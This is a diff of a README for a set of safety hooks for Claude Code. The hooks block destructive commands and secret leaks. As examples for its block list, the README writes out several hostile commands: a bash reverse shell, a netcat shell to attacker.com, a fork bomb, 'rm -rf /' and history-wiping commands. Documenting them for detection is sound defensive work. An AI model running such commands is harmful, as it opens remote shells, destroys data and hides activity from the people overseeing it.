@@ -5,13 +5,19 @@
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![Version](https://img.shields.io/badge/version-1.1.0-blue)
 
-Community framework for Claude Code hooks — Python Claude Code plugins for UserPromptSubmit and PreToolUse events.
+Safety guardrails for Claude Code — stop accidental data loss, secret leaks, and dangerous commands before they execute.
 
-## What it does
+## Why
 
-- **prompt-improver**: Evaluates prompt clarity on every UserPromptSubmit; asks 1-6 targeted questions when a prompt is vague.
-- **danger-detector**: Blocks destructive Bash commands (`rm -rf`, `DROP TABLE`, force push, shutdown, iptables flush) on PreToolUse; unwraps `bash -c` and `python -c` before checking.
-- **secret-guard**: Blocks AWS keys, GitHub tokens, private keys, and Stripe keys from appearing in Bash, Write, and Edit operations; uses entropy filtering; supports `[allow-secret]` tag override.
+Claude Code is powerful. That's the problem.
+
+- It will run `rm -rf` if you ask it to clean up. Sometimes on the wrong directory.
+- It will write your AWS key into a config file, commit it, and push.
+- It will ask you twelve questions about a two-word prompt.
+
+aiclair adds three hooks that run silently on every prompt and tool call. They block the dangerous stuff, catch secrets before they land in files, and ask clarifying questions only when a prompt is genuinely vague.
+
+No pip install. No build step. Pure Python stdlib.
 
 ## Install
 
@@ -19,17 +25,13 @@ Community framework for Claude Code hooks — Python Claude Code plugins for Use
 curl -fsSL https://raw.githubusercontent.com/aiclair-community/aiclair/main/install.sh | bash
 ```
 
-The script prompts you to pick which hooks to install, then wires them into `~/.claude/settings.json`. No pip install, no build step.
-
-**Install all hooks without prompts:**
+Pick which hooks to install interactively, or use flags:
 
 ```bash
+# Install everything
 curl -fsSL https://raw.githubusercontent.com/aiclair-community/aiclair/main/install.sh | bash -s -- --all
-```
 
-**Install specific hooks:**
-
-```bash
+# Install specific hooks
 curl -fsSL https://raw.githubusercontent.com/aiclair-community/aiclair/main/install.sh | bash -s -- --hooks "danger-detector secret-guard"
 ```
 
@@ -41,25 +43,55 @@ bash ~/.claude/plugins/aiclair/uninstall.sh
 
 ## Hooks
 
-| Hook | Event | What it does |
+| Hook | Fires on | What it does |
 |---|---|---|
-| [prompt-improver](packages/hooks/prompt-improver/) | UserPromptSubmit | Evaluates prompt clarity; asks 1-6 targeted questions for vague prompts |
-| [danger-detector](packages/hooks/danger-detector/) | PreToolUse (Bash) | Blocks `rm -rf`, `DROP TABLE`, force push, shutdown, iptables flush; unwraps `bash -c`/`python -c` |
-| [secret-guard](packages/hooks/secret-guard/) | PreToolUse (Bash/Write/Edit) + PostToolUse (Bash) | Blocks AWS keys, GitHub tokens, private keys, Stripe keys; entropy filtering; `[allow-secret]` tag override |
+| [prompt-improver](packages/hooks/prompt-improver/) | Every prompt | Asks 1–6 targeted questions when a prompt is vague. Clear prompts pass through immediately. |
+| [danger-detector](packages/hooks/danger-detector/) | Bash commands | Blocks destructive and malicious commands before they run. |
+| [secret-guard](packages/hooks/secret-guard/) | File writes, Bash commands, Bash output | Blocks secrets from landing in files or leaking through commands. |
 
-## Bypass prefixes
+### What danger-detector blocks
 
-Applies to prompt-improver only.
-
-| Prefix | Behavior |
+| Pattern | Example |
 |---|---|
-| `* ` | Skip evaluation entirely |
-| `/command` | Slash commands pass through automatically |
-| `# ` | Memorize commands pass through automatically |
+| Recursive deletion | `rm -rf ./src` |
+| Destructive SQL | `DROP TABLE users` |
+| Force push | `git push --force origin main` |
+| System shutdown | `shutdown now`, `reboot` |
+| Firewall flush | `iptables -F` |
+| Kill all processes | `killall -9`, `pkill -9` |
+| Reverse shells | `bash -i >& /dev/tcp/10.0.0.1/4444` |
+| Netcat shells | `nc -e /bin/bash attacker.com 4444` |
+| Fork bombs | `:(){:|:&};:` |
+| Anti-forensics | `history -c`, `shred -u`, `unset HISTFILE` |
+
+Nested commands are unwrapped: `bash -c "rm -rf /"` is caught too.
+
+### What secret-guard blocks
+
+| Secret type | Detected by |
+|---|---|
+| AWS access keys | `AKIA...` prefix pattern |
+| GitHub tokens | `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_` prefixes |
+| Private keys | PEM header detection |
+| Stripe live keys | `sk_live_` prefix |
+| Generic API keys | Variable name + high entropy value |
+| Exfiltration via netcat / scp / base64 | Command pattern matching |
+
+`.env.example`, `.env.sample`, and similar template files are always allowed.
+
+## Bypass
+
+Prefix any prompt with `* ` to skip all hooks for that turn.
+
+```
+* rm -rf dist/ && rebuild
+```
+
+This bypasses prompt-improver, danger-detector, and secret-guard for that one turn. The `* ` is stripped before Claude sees the prompt.
 
 ## Per-project config
 
-danger-detector reads `.aiclair.json` at the project root to allow patterns that would otherwise be blocked.
+Allow specific patterns that danger-detector would otherwise block. Create `.aiclair.json` at the project root:
 
 ```json
 {
@@ -72,13 +104,13 @@ danger-detector reads `.aiclair.json` at the project root to allow patterns that
 }
 ```
 
+Any command containing an allowed pattern passes through without checking.
+
 ## Contributing
 
-1. Copy `packages/hooks/_template` to `packages/hooks/<your-hook-name>/`.
-2. Implement `hook.py` — under 80 lines, standard library only.
-3. Add `metadata.json` with hook name, event, and description.
-4. Write tests in `tests/`.
-5. Run `python3 scripts/validate-hook.py` to check structure and style.
+See [CONTRIBUTING.md](CONTRIBUTING.md) for how to add a hook, run tests, and open a PR.
+
+Hook ideas, false positives, and bug reports: [open an issue](https://github.com/aiclair-community/aiclair/issues/new/choose).
 
 ## License
 
